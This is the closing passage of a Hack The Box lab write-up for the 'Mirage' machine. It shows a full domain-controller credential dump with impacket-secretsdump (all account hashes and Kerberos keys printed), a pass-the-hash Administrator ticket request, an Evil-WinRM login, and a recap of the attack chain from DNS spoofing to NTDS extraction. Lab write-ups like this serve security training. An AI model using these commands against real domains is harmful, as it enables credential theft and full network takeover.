And we can dump the `Administrator` hash, or all of that like this:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Mirage/root]
└─$ impacket-secretsdump -k -no-pass dc01.mirage.htb 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1adcc3d4a7f007ca8ab8a3a671a66127:::
mirage.htb\Dev_Account_A:1104:aad3b435b51404eeaad3b435b51404ee:3db621dd880ebe4d22351480176dba13:::
mirage.htb\Dev_Account_B:1105:aad3b435b51404eeaad3b435b51404ee:fd1a971892bfd046fc5dd9fb8a5db0b3:::
mirage.htb\david.jjackson:1107:aad3b435b51404eeaad3b435b51404ee:ce781520ff23cdfe2a6f7d274c6447f8:::
mirage.htb\javier.mmarshall:1108:aad3b435b51404eeaad3b435b51404ee:694fba7016ea1abd4f36d188b3983d84:::
mirage.htb\mark.bbond:1109:aad3b435b51404eeaad3b435b51404ee:8fe1f7f9e9148b3bdeb368f9ff7645eb:::
mirage.htb\nathan.aadam:1110:aad3b435b51404eeaad3b435b51404ee:1cdd3c6d19586fd3a8120b89571a04eb:::
mirage.htb\svc_mirage:2604:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b5b26ce83b5ad77439042fbf9246c86c:::
Mirage-Service$:1112:aad3b435b51404eeaad3b435b51404ee:738eeff47da231dec805583638b8a91f:::
[*] Kerberos keys grabbed
mirage.htb\Administrator:aes256-cts-hmac-sha1-96:09454bbc6da252ac958d0eaa211293070bce0a567c0e08da5406ad0bce4bdca7
mirage.htb\Administrator:aes128-cts-hmac-sha1-96:47aa953930634377bad3a00da2e36c07
mirage.htb\Administrator:des-cbc-md5:e02a73baa10b8619
krbtgt:aes256-cts-hmac-sha1-96:95f7af8ea1bae174de9666c99a9b9edeac0ca15e70c7246cab3f83047c059603
krbtgt:aes128-cts-hmac-sha1-96:6f790222a7ee5ba9d2776f6ee71d1bfb
krbtgt:des-cbc-md5:8cd65e54d343ba25
mirage.htb\Dev_Account_A:aes256-cts-hmac-sha1-96:e4a6658ff9ee0d2a097864d6e89218287691bf905680e0078a8e41498f33fd9a
mirage.htb\Dev_Account_A:aes128-cts-hmac-sha1-96:ceee67c4feca95b946e78d89cb8b4c15
mirage.htb\Dev_Account_A:des-cbc-md5:26dce5389b921a52
mirage.htb\Dev_Account_B:aes256-cts-hmac-sha1-96:5c320d4bef414f6a202523adfe2ef75526ff4fc6f943aaa0833a50d102f7a95d
mirage.htb\Dev_Account_B:aes128-cts-hmac-sha1-96:e05bdceb6b470755cd01fab2f526b6c0
mirage.htb\Dev_Account_B:des-cbc-md5:e5d07f57e926ecda
mirage.htb\david.jjackson:aes256-cts-hmac-sha1-96:3480514043b05841ecf08dfbf33d81d361e51a6d03ff0c3f6d51bfec7f09dbdb
mirage.htb\david.jjackson:aes128-cts-hmac-sha1-96:bd841caf9cd85366d254cd855e61cd5e
mirage.htb\david.jjackson:des-cbc-md5:76ef68d529459bbc
mirage.htb\javier.mmarshall:aes256-cts-hmac-sha1-96:20acfd56be43c1123b3428afa66bb504a9b32d87c3269277e6c917bf0e425502
mirage.htb\javier.mmarshall:aes128-cts-hmac-sha1-96:9d2fc7611e15be6fe16538ebb3b2ad6a
mirage.htb\javier.mmarshall:des-cbc-md5:6b3d51897fdc3237
mirage.htb\mark.bbond:aes256-cts-hmac-sha1-96:dc423caaf884bb869368859c59779a757ff38a88bdf4197a4a284b599531cd27
mirage.htb\mark.bbond:aes128-cts-hmac-sha1-96:78fcb9736fbafe245c7b52e72339165d
mirage.htb\mark.bbond:des-cbc-md5:d929fb462ae361a7
mirage.htb\nathan.aadam:aes256-cts-hmac-sha1-96:b536033ac796c7047bcfd47c94e315aea1576a97ff371e2be2e0250cce64375b
mirage.htb\nathan.aadam:aes128-cts-hmac-sha1-96:b1097eb42fd74827c6d8102a657e28ff
mirage.htb\nathan.aadam:des-cbc-md5:5137a74f40f483c7
mirage.htb\svc_mirage:aes256-cts-hmac-sha1-96:937efa5352253096b3b2e1d31a9f378f422d9e357a5d4b3af0d260ba1320ba5e
mirage.htb\svc_mirage:aes128-cts-hmac-sha1-96:8d382d597b707379a254c60b85574ab1
mirage.htb\svc_mirage:des-cbc-md5:2f13c12f9d5d6708
DC01$:aes256-cts-hmac-sha1-96:4a85665cd877c7b5179c508e5bc4bad63eafe514f7cedb0543930431ef1e422b
DC01$:aes128-cts-hmac-sha1-96:94aa2a6d9e156b7e8c03a9aad4af2cc1
DC01$:des-cbc-md5:cb19ce2c733b3ba8
Mirage-Service$:aes256-cts-hmac-sha1-96:7c7cf51a944c05f934f055683959f1aa12230cbc42072cff8def34442c0fad8b
Mirage-Service$:aes128-cts-hmac-sha1-96:a21199c62fd336f19f6fbf167ae3fced
Mirage-Service$:des-cbc-md5:c7bab0613bea374a
[*] Cleaning up... 
```

Now request a ticket for `Administrator`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Mirage/root]
└─$ impacket-getTGT mirage.htb/Administrator -hashes :7be6d4f3c2b9c0e3560f5a29eeb1afb3 -dc-ip 10.10.11.78
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
```

And use [Evil-WinRM](../../../3%20-%20Tags/Hacking%20Tools/Evil-WinRM.md) again for the root flag:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Mirage/root]
└─$ evil-winrm -i dc01.mirage.htb -k Administrator.ccache -r MIRAGE.HTB 

*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
  HTB{{REDACTED_FLAG}}
```

Pwned !!
# RECAP:

1. **NFS Share Enumeration** → PDF intelligence gathering
2. **DNS Spoofing** → Redirect NATS traffic to rogue server
3. **NATS Credential Interception** → Capture Dev_Account_A credentials
4. **NATS Message Queue Access** → Extract david.jjackson credentials
5. **Kerberoasting** → Crack nathan.aadam password
6. **AutoLogon Discovery** → Find mark.bbond credentials
7. **Account Reactivation** → Enable javier.mmarshall via IT_SUPPORT privileges
8. **GMSA Password Extraction** → Obtain Mirage-Service$ hash
9. **ESC10 Certificate Attack** → Manipulate certificate mappings
10. **RBCD Configuration** → Grant delegation rights to nathan.aadam
11. **S4U2Proxy Impersonation** → Impersonate DC01 machine account
12. **NTDS Dump** → Extract all domain hashes including Administrator